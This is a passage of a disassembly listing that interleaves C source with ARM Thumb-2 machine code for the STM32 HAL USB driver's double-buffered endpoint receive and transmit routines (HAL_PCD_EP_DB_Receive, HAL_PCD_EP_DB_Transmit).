 80030d8:	b29b      	uxth	r3, r3
 80030da:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80030de:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80030e2:	83bb      	strh	r3, [r7, #28]
 80030e4:	68fb      	ldr	r3, [r7, #12]
 80030e6:	681b      	ldr	r3, [r3, #0]
 80030e8:	461a      	mov	r2, r3
 80030ea:	68bb      	ldr	r3, [r7, #8]
 80030ec:	781b      	ldrb	r3, [r3, #0]
 80030ee:	009b      	lsls	r3, r3, #2
 80030f0:	441a      	add	r2, r3
 80030f2:	8bbb      	ldrh	r3, [r7, #28]
 80030f4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80030f8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80030fc:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8003100:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8003104:	b29b      	uxth	r3, r3
 8003106:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8003108:	8b7b      	ldrh	r3, [r7, #26]
 800310a:	2b00      	cmp	r3, #0
 800310c:	d008      	beq.n	8003120 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 800310e:	68fb      	ldr	r3, [r7, #12]
 8003110:	6818      	ldr	r0, [r3, #0]
 8003112:	68bb      	ldr	r3, [r7, #8]
 8003114:	6959      	ldr	r1, [r3, #20]
 8003116:	68bb      	ldr	r3, [r7, #8]
 8003118:	895a      	ldrh	r2, [r3, #10]
 800311a:	8b7b      	ldrh	r3, [r7, #26]
 800311c:	f005 faf7 	bl	800870e <USB_ReadPMA>
    }
  }

  return count;
 8003120:	8b7b      	ldrh	r3, [r7, #26]
}
 8003122:	4618      	mov	r0, r3
 8003124:	3720      	adds	r7, #32
 8003126:	46bd      	mov	sp, r7
 8003128:	bd80      	pop	{r7, pc}

0800312a <HAL_PCD_EP_DB_Transmit>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static HAL_StatusTypeDef HAL_PCD_EP_DB_Transmit(PCD_HandleTypeDef *hpcd,
                                                PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 800312a:	b580      	push	{r7, lr}
 800312c:	b0a4      	sub	sp, #144	; 0x90
 800312e:	af00      	add	r7, sp, #0
 8003130:	60f8      	str	r0, [r7, #12]
 8003132:	60b9      	str	r1, [r7, #8]
 8003134:	4613      	mov	r3, r2
 8003136:	80fb      	strh	r3, [r7, #6]
  uint32_t len;
  uint16_t TxPctSize;

  /* Data Buffer0 ACK received */
  if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8003138:	88fb      	ldrh	r3, [r7, #6]
 800313a:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800313e:	2b00      	cmp	r3, #0
 8003140:	f000 81db 	beq.w	80034fa <HAL_PCD_EP_DB_Transmit+0x3d0>
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8003144:	68fb      	ldr	r3, [r7, #12]
 8003146:	681b      	ldr	r3, [r3, #0]
 8003148:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800314c:	b29b      	uxth	r3, r3
 800314e:	461a      	mov	r2, r3
 8003150:	68bb      	ldr	r3, [r7, #8]
 8003152:	781b      	ldrb	r3, [r3, #0]
 8003154:	00db      	lsls	r3, r3, #3
 8003156:	4413      	add	r3, r2
 8003158:	68fa      	ldr	r2, [r7, #12]
 800315a:	6812      	ldr	r2, [r2, #0]
 800315c:	4413      	add	r3, r2
 800315e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003162:	881b      	ldrh	r3, [r3, #0]
 8003164:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003168:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len > TxPctSize)
 800316c:	68bb      	ldr	r3, [r7, #8]
 800316e:	699a      	ldr	r2, [r3, #24]
 8003170:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003174:	429a      	cmp	r2, r3
 8003176:	d907      	bls.n	8003188 <HAL_PCD_EP_DB_Transmit+0x5e>
    {
      ep->xfer_len -= TxPctSize;
 8003178:	68bb      	ldr	r3, [r7, #8]
 800317a:	699a      	ldr	r2, [r3, #24]
 800317c:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003180:	1ad2      	subs	r2, r2, r3
 8003182:	68bb      	ldr	r3, [r7, #8]
 8003184:	619a      	str	r2, [r3, #24]
 8003186:	e002      	b.n	800318e <HAL_PCD_EP_DB_Transmit+0x64>
    }
    else
    {
      ep->xfer_len = 0U;
 8003188:	68bb      	ldr	r3, [r7, #8]
 800318a:	2200      	movs	r2, #0
 800318c:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 800318e:	68bb      	ldr	r3, [r7, #8]
 8003190:	699b      	ldr	r3, [r3, #24]
 8003192:	2b00      	cmp	r3, #0
 8003194:	f040 80b9 	bne.w	800330a <HAL_PCD_EP_DB_Transmit+0x1e0>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003198:	68bb      	ldr	r3, [r7, #8]
 800319a:	785b      	ldrb	r3, [r3, #1]
 800319c:	2b00      	cmp	r3, #0
 800319e:	d126      	bne.n	80031ee <HAL_PCD_EP_DB_Transmit+0xc4>
 80031a0:	68fb      	ldr	r3, [r7, #12]
 80031a2:	681b      	ldr	r3, [r3, #0]
 80031a4:	62fb      	str	r3, [r7, #44]	; 0x2c
 80031a6:	68fb      	ldr	r3, [r7, #12]
 80031a8:	681b      	ldr	r3, [r3, #0]
 80031aa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80031ae:	b29b      	uxth	r3, r3
 80031b0:	461a      	mov	r2, r3
 80031b2:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 80031b4:	4413      	add	r3, r2
 80031b6:	62fb      	str	r3, [r7, #44]	; 0x2c
 80031b8:	68bb      	ldr	r3, [r7, #8]
 80031ba:	781b      	ldrb	r3, [r3, #0]
 80031bc:	00da      	lsls	r2, r3, #3
 80031be:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 80031c0:	4413      	add	r3, r2
 80031c2:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80031c6:	62bb      	str	r3, [r7, #40]	; 0x28
 80031c8:	6abb      	ldr	r3, [r7, #40]	; 0x28
 80031ca:	881b      	ldrh	r3, [r3, #0]
 80031cc:	b29b      	uxth	r3, r3
 80031ce:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80031d2:	b29a      	uxth	r2, r3
 80031d4:	6abb      	ldr	r3, [r7, #40]	; 0x28
 80031d6:	801a      	strh	r2, [r3, #0]
 80031d8:	6abb      	ldr	r3, [r7, #40]	; 0x28
 80031da:	881b      	ldrh	r3, [r3, #0]
 80031dc:	b29b      	uxth	r3, r3
 80031de:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80031e2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80031e6:	b29a      	uxth	r2, r3
 80031e8:	6abb      	ldr	r3, [r7, #40]	; 0x28
 80031ea:	801a      	strh	r2, [r3, #0]
 80031ec:	e01a      	b.n	8003224 <HAL_PCD_EP_DB_Transmit+0xfa>
 80031ee:	68bb      	ldr	r3, [r7, #8]
 80031f0:	785b      	ldrb	r3, [r3, #1]
 80031f2:	2b01      	cmp	r3, #1
 80031f4:	d116      	bne.n	8003224 <HAL_PCD_EP_DB_Transmit+0xfa>
 80031f6:	68fb      	ldr	r3, [r7, #12]
 80031f8:	681b      	ldr	r3, [r3, #0]
 80031fa:	637b      	str	r3, [r7, #52]	; 0x34
 80031fc:	68fb      	ldr	r3, [r7, #12]
 80031fe:	681b      	ldr	r3, [r3, #0]
 8003200:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003204:	b29b      	uxth	r3, r3
 8003206:	461a      	mov	r2, r3
 8003208:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800320a:	4413      	add	r3, r2
 800320c:	637b      	str	r3, [r7, #52]	; 0x34
 800320e:	68bb      	ldr	r3, [r7, #8]
 8003210:	781b      	ldrb	r3, [r3, #0]
 8003212:	00da      	lsls	r2, r3, #3
 8003214:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8003216:	4413      	add	r3, r2
 8003218:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800321c:	633b      	str	r3, [r7, #48]	; 0x30
 800321e:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8003220:	2200      	movs	r2, #0
 8003222:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003224:	68fb      	ldr	r3, [r7, #12]
 8003226:	681b      	ldr	r3, [r3, #0]
 8003228:	627b      	str	r3, [r7, #36]	; 0x24
 800322a:	68bb      	ldr	r3, [r7, #8]
 800322c:	785b      	ldrb	r3, [r3, #1]
 800322e:	2b00      	cmp	r3, #0
 8003230:	d126      	bne.n	8003280 <HAL_PCD_EP_DB_Transmit+0x156>
 8003232:	68fb      	ldr	r3, [r7, #12]
 8003234:	681b      	ldr	r3, [r3, #0]
 8003236:	61fb      	str	r3, [r7, #28]
 8003238:	68fb      	ldr	r3, [r7, #12]
 800323a:	681b      	ldr	r3, [r3, #0]
 800323c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003240:	b29b      	uxth	r3, r3
 8003242:	461a      	mov	r2, r3
 8003244:	69fb      	ldr	r3, [r7, #28]
 8003246:	4413      	add	r3, r2
 8003248:	61fb      	str	r3, [r7, #28]
 800324a:	68bb      	ldr	r3, [r7, #8]
 800324c:	781b      	ldrb	r3, [r3, #0]
 800324e:	00da      	lsls	r2, r3, #3
 8003250:	69fb      	ldr	r3, [r7, #28]
 8003252:	4413      	add	r3, r2
 8003254:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003258:	61bb      	str	r3, [r7, #24]
 800325a:	69bb      	ldr	r3, [r7, #24]
 800325c:	881b      	ldrh	r3, [r3, #0]
 800325e:	b29b      	uxth	r3, r3
 8003260:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003264:	b29a      	uxth	r2, r3
 8003266:	69bb      	ldr	r3, [r7, #24]
 8003268:	801a      	strh	r2, [r3, #0]
 800326a:	69bb      	ldr	r3, [r7, #24]
 800326c:	881b      	ldrh	r3, [r3, #0]
 800326e:	b29b      	uxth	r3, r3
 8003270:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003274:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003278:	b29a      	uxth	r2, r3
 800327a:	69bb      	ldr	r3, [r7, #24]
 800327c:	801a      	strh	r2, [r3, #0]
 800327e:	e017      	b.n	80032b0 <HAL_PCD_EP_DB_Transmit+0x186>
 8003280:	68bb      	ldr	r3, [r7, #8]
 8003282:	785b      	ldrb	r3, [r3, #1]
 8003284:	2b01      	cmp	r3, #1
 8003286:	d113      	bne.n	80032b0 <HAL_PCD_EP_DB_Transmit+0x186>
 8003288:	68fb      	ldr	r3, [r7, #12]
 800328a:	681b      	ldr	r3, [r3, #0]
 800328c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003290:	b29b      	uxth	r3, r3
 8003292:	461a      	mov	r2, r3
 8003294:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8003296:	4413      	add	r3, r2
 8003298:	627b      	str	r3, [r7, #36]	; 0x24
 800329a:	68bb      	ldr	r3, [r7, #8]
 800329c:	781b      	ldrb	r3, [r3, #0]
 800329e:	00da      	lsls	r2, r3, #3
 80032a0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80032a2:	4413      	add	r3, r2
 80032a4:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80032a8:	623b      	str	r3, [r7, #32]
 80032aa:	6a3b      	ldr	r3, [r7, #32]
 80032ac:	2200      	movs	r2, #0
 80032ae:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 80032b0:	68bb      	ldr	r3, [r7, #8]
 80032b2:	781b      	ldrb	r3, [r3, #0]
 80032b4:	4619      	mov	r1, r3
 80032b6:	68f8      	ldr	r0, [r7, #12]
 80032b8:	f009 fc49 	bl	800cb4e <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 80032bc:	88fb      	ldrh	r3, [r7, #6]
 80032be:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80032c2:	2b00      	cmp	r3, #0
 80032c4:	f000 82fa 	beq.w	80038bc <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 80032c8:	68fb      	ldr	r3, [r7, #12]
 80032ca:	681b      	ldr	r3, [r3, #0]
 80032cc:	461a      	mov	r2, r3
 80032ce:	68bb      	ldr	r3, [r7, #8]
 80032d0:	781b      	ldrb	r3, [r3, #0]
 80032d2:	009b      	lsls	r3, r3, #2
 80032d4:	4413      	add	r3, r2
 80032d6:	881b      	ldrh	r3, [r3, #0]
 80032d8:	b29b      	uxth	r3, r3
 80032da:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80032de:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80032e2:	82fb      	strh	r3, [r7, #22]
 80032e4:	68fb      	ldr	r3, [r7, #12]
 80032e6:	681b      	ldr	r3, [r3, #0]
 80032e8:	461a      	mov	r2, r3
 80032ea:	68bb      	ldr	r3, [r7, #8]
 80032ec:	781b      	ldrb	r3, [r3, #0]
 80032ee:	009b      	lsls	r3, r3, #2
 80032f0:	441a      	add	r2, r3
 80032f2:	8afb      	ldrh	r3, [r7, #22]
 80032f4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80032f8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80032fc:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003300:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003304:	b29b      	uxth	r3, r3
 8003306:	8013      	strh	r3, [r2, #0]
 8003308:	e2d8      	b.n	80038bc <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 800330a:	88fb      	ldrh	r3, [r7, #6]
 800330c:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003310:	2b00      	cmp	r3, #0
 8003312:	d021      	beq.n	8003358 <HAL_PCD_EP_DB_Transmit+0x22e>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003314:	68fb      	ldr	r3, [r7, #12]
 8003316:	681b      	ldr	r3, [r3, #0]
 8003318:	461a      	mov	r2, r3
 800331a:	68bb      	ldr	r3, [r7, #8]
 800331c:	781b      	ldrb	r3, [r3, #0]
 800331e:	009b      	lsls	r3, r3, #2
 8003320:	4413      	add	r3, r2
 8003322:	881b      	ldrh	r3, [r3, #0]
 8003324:	b29b      	uxth	r3, r3
 8003326:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800332a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800332e:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8003332:	68fb      	ldr	r3, [r7, #12]
 8003334:	681b      	ldr	r3, [r3, #0]
 8003336:	461a      	mov	r2, r3
 8003338:	68bb      	ldr	r3, [r7, #8]
 800333a:	781b      	ldrb	r3, [r3, #0]
 800333c:	009b      	lsls	r3, r3, #2
 800333e:	441a      	add	r2, r3
 8003340:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 8003344:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003348:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800334c:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003350:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003354:	b29b      	uxth	r3, r3
 8003356:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 8003358:	68bb      	ldr	r3, [r7, #8]
 800335a:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 800335e:	2b01      	cmp	r3, #1
 8003360:	f040 82ac 	bne.w	80038bc <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 8003364:	68bb      	ldr	r3, [r7, #8]
 8003366:	695a      	ldr	r2, [r3, #20]
 8003368:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800336c:	441a      	add	r2, r3
 800336e:	68bb      	ldr	r3, [r7, #8]
 8003370:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 8003372:	68bb      	ldr	r3, [r7, #8]
 8003374:	69da      	ldr	r2, [r3, #28]
 8003376:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800337a:	441a      	add	r2, r3
 800337c:	68bb      	ldr	r3, [r7, #8]
 800337e:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 8003380:	68bb      	ldr	r3, [r7, #8]
 8003382:	6a1a      	ldr	r2, [r3, #32]
 8003384:	68bb      	ldr	r3, [r7, #8]
 8003386:	691b      	ldr	r3, [r3, #16]
 8003388:	429a      	cmp	r2, r3
 800338a:	d30b      	bcc.n	80033a4 <HAL_PCD_EP_DB_Transmit+0x27a>
        {
          len = ep->maxpacket;
 800338c:	68bb      	ldr	r3, [r7, #8]
 800338e:	691b      	ldr	r3, [r3, #16]
 8003390:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 8003394:	68bb      	ldr	r3, [r7, #8]
 8003396:	6a1a      	ldr	r2, [r3, #32]
 8003398:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800339c:	1ad2      	subs	r2, r2, r3
 800339e:	68bb      	ldr	r3, [r7, #8]
 80033a0:	621a      	str	r2, [r3, #32]
 80033a2:	e017      	b.n	80033d4 <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else if (ep->xfer_len_db == 0U)
 80033a4:	68bb      	ldr	r3, [r7, #8]
 80033a6:	6a1b      	ldr	r3, [r3, #32]
 80033a8:	2b00      	cmp	r3, #0
 80033aa:	d108      	bne.n	80033be <HAL_PCD_EP_DB_Transmit+0x294>
        {
          len = TxPctSize;
 80033ac:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80033b0:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 80033b4:	68bb      	ldr	r3, [r7, #8]
 80033b6:	2200      	movs	r2, #0
 80033b8:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 80033bc:	e00a      	b.n	80033d4 <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else
        {
          ep->xfer_fill_db = 0U;
 80033be:	68bb      	ldr	r3, [r7, #8]
 80033c0:	2200      	movs	r2, #0
 80033c2:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
          len = ep->xfer_len_db;
 80033c6:	68bb      	ldr	r3, [r7, #8]
 80033c8:	6a1b      	ldr	r3, [r3, #32]
 80033ca:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 80033ce:	68bb      	ldr	r3, [r7, #8]
 80033d0:	2200      	movs	r2, #0
 80033d2:	621a      	str	r2, [r3, #32]
        }

        /* Write remaining Data to Buffer */
        /* Set the Double buffer counter for pma buffer1 */
        PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 80033d4:	68bb      	ldr	r3, [r7, #8]
 80033d6:	785b      	ldrb	r3, [r3, #1]
 80033d8:	2b00      	cmp	r3, #0
 80033da:	d165      	bne.n	80034a8 <HAL_PCD_EP_DB_Transmit+0x37e>
 80033dc:	68fb      	ldr	r3, [r7, #12]
 80033de:	681b      	ldr	r3, [r3, #0]
 80033e0:	63fb      	str	r3, [r7, #60]	; 0x3c
 80033e2:	68fb      	ldr	r3, [r7, #12]
 80033e4:	681b      	ldr	r3, [r3, #0]
 80033e6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80033ea:	b29b      	uxth	r3, r3
 80033ec:	461a      	mov	r2, r3
 80033ee:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80033f0:	4413      	add	r3, r2
 80033f2:	63fb      	str	r3, [r7, #60]	; 0x3c
 80033f4:	68bb      	ldr	r3, [r7, #8]
 80033f6:	781b      	ldrb	r3, [r3, #0]
 80033f8:	00da      	lsls	r2, r3, #3
 80033fa:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80033fc:	4413      	add	r3, r2
 80033fe:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003402:	63bb      	str	r3, [r7, #56]	; 0x38
 8003404:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003406:	881b      	ldrh	r3, [r3, #0]
 8003408:	b29b      	uxth	r3, r3
 800340a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800340e:	b29a      	uxth	r2, r3
 8003410:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003412:	801a      	strh	r2, [r3, #0]
 8003414:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003418:	2b3e      	cmp	r3, #62	; 0x3e
 800341a:	d91d      	bls.n	8003458 <HAL_PCD_EP_DB_Transmit+0x32e>
 800341c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003420:	095b      	lsrs	r3, r3, #5
 8003422:	64bb      	str	r3, [r7, #72]	; 0x48
 8003424:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003428:	f003 031f 	and.w	r3, r3, #31
 800342c:	2b00      	cmp	r3, #0
 800342e:	d102      	bne.n	8003436 <HAL_PCD_EP_DB_Transmit+0x30c>
 8003430:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003432:	3b01      	subs	r3, #1
 8003434:	64bb      	str	r3, [r7, #72]	; 0x48
 8003436:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003438:	881b      	ldrh	r3, [r3, #0]
 800343a:	b29a      	uxth	r2, r3
 800343c:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 800343e:	b29b      	uxth	r3, r3
 8003440:	029b      	lsls	r3, r3, #10
 8003442:	b29b      	uxth	r3, r3
 8003444:	4313      	orrs	r3, r2
 8003446:	b29b      	uxth	r3, r3
 8003448:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800344c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003450:	b29a      	uxth	r2, r3
 8003452:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003454:	801a      	strh	r2, [r3, #0]
 8003456:	e044      	b.n	80034e2 <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003458:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800345c:	2b00      	cmp	r3, #0
 800345e:	d10a      	bne.n	8003476 <HAL_PCD_EP_DB_Transmit+0x34c>
 8003460:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003462:	881b      	ldrh	r3, [r3, #0]
 8003464:	b29b      	uxth	r3, r3
 8003466:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800346a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800346e:	b29a      	uxth	r2, r3
 8003470:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003472:	801a      	strh	r2, [r3, #0]
 8003474:	e035      	b.n	80034e2 <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003476:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800347a:	085b      	lsrs	r3, r3, #1
 800347c:	64bb      	str	r3, [r7, #72]	; 0x48
 800347e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003482:	f003 0301 	and.w	r3, r3, #1
 8003486:	2b00      	cmp	r3, #0
 8003488:	d002      	beq.n	8003490 <HAL_PCD_EP_DB_Transmit+0x366>
 800348a:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 800348c:	3301      	adds	r3, #1
 800348e:	64bb      	str	r3, [r7, #72]	; 0x48
 8003490:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003492:	881b      	ldrh	r3, [r3, #0]
 8003494:	b29a      	uxth	r2, r3
 8003496:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003498:	b29b      	uxth	r3, r3
 800349a:	029b      	lsls	r3, r3, #10
 800349c:	b29b      	uxth	r3, r3
 800349e:	4313      	orrs	r3, r2
 80034a0:	b29a      	uxth	r2, r3
 80034a2:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80034a4:	801a      	strh	r2, [r3, #0]
 80034a6:	e01c      	b.n	80034e2 <HAL_PCD_EP_DB_Transmit+0x3b8>
 80034a8:	68bb      	ldr	r3, [r7, #8]
 80034aa:	785b      	ldrb	r3, [r3, #1]
 80034ac:	2b01      	cmp	r3, #1
 80034ae:	d118      	bne.n	80034e2 <HAL_PCD_EP_DB_Transmit+0x3b8>
 80034b0:	68fb      	ldr	r3, [r7, #12]
 80034b2:	681b      	ldr	r3, [r3, #0]
 80034b4:	647b      	str	r3, [r7, #68]	; 0x44
 80034b6:	68fb      	ldr	r3, [r7, #12]
 80034b8:	681b      	ldr	r3, [r3, #0]
 80034ba:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80034be:	b29b      	uxth	r3, r3
 80034c0:	461a      	mov	r2, r3
 80034c2:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80034c4:	4413      	add	r3, r2
 80034c6:	647b      	str	r3, [r7, #68]	; 0x44
 80034c8:	68bb      	ldr	r3, [r7, #8]
 80034ca:	781b      	ldrb	r3, [r3, #0]
 80034cc:	00da      	lsls	r2, r3, #3
 80034ce:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80034d0:	4413      	add	r3, r2
 80034d2:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80034d6:	643b      	str	r3, [r7, #64]	; 0x40
 80034d8:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80034dc:	b29a      	uxth	r2, r3
 80034de:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 80034e0:	801a      	strh	r2, [r3, #0]

        /* Copy user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr0, (uint16_t)len);
 80034e2:	68fb      	ldr	r3, [r7, #12]
 80034e4:	6818      	ldr	r0, [r3, #0]
 80034e6:	68bb      	ldr	r3, [r7, #8]
 80034e8:	6959      	ldr	r1, [r3, #20]
 80034ea:	68bb      	ldr	r3, [r7, #8]
 80034ec:	891a      	ldrh	r2, [r3, #8]
 80034ee:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80034f2:	b29b      	uxth	r3, r3
 80034f4:	f005 f8c9 	bl	800868a <USB_WritePMA>
 80034f8:	e1e0      	b.n	80038bc <HAL_PCD_EP_DB_Transmit+0x792>
    }
  }
  else /* Data Buffer1 ACK received */
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 80034fa:	68fb      	ldr	r3, [r7, #12]
 80034fc:	681b      	ldr	r3, [r3, #0]
 80034fe:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003502:	b29b      	uxth	r3, r3
 8003504:	461a      	mov	r2, r3
 8003506:	68bb      	ldr	r3, [r7, #8]
 8003508:	781b      	ldrb	r3, [r3, #0]
 800350a:	00db      	lsls	r3, r3, #3
 800350c:	4413      	add	r3, r2
 800350e:	68fa      	ldr	r2, [r7, #12]
 8003510:	6812      	ldr	r2, [r2, #0]
 8003512:	4413      	add	r3, r2
 8003514:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003518:	881b      	ldrh	r3, [r3, #0]
 800351a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800351e:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len >= TxPctSize)
 8003522:	68bb      	ldr	r3, [r7, #8]
 8003524:	699a      	ldr	r2, [r3, #24]
 8003526:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800352a:	429a      	cmp	r2, r3
 800352c:	d307      	bcc.n	800353e <HAL_PCD_EP_DB_Transmit+0x414>
    {
      ep->xfer_len -= TxPctSize;
 800352e:	68bb      	ldr	r3, [r7, #8]
 8003530:	699a      	ldr	r2, [r3, #24]
 8003532:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003536:	1ad2      	subs	r2, r2, r3
 8003538:	68bb      	ldr	r3, [r7, #8]
 800353a:	619a      	str	r2, [r3, #24]
 800353c:	e002      	b.n	8003544 <HAL_PCD_EP_DB_Transmit+0x41a>
    }
    else
    {
      ep->xfer_len = 0U;
 800353e:	68bb      	ldr	r3, [r7, #8]
 8003540:	2200      	movs	r2, #0
 8003542:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
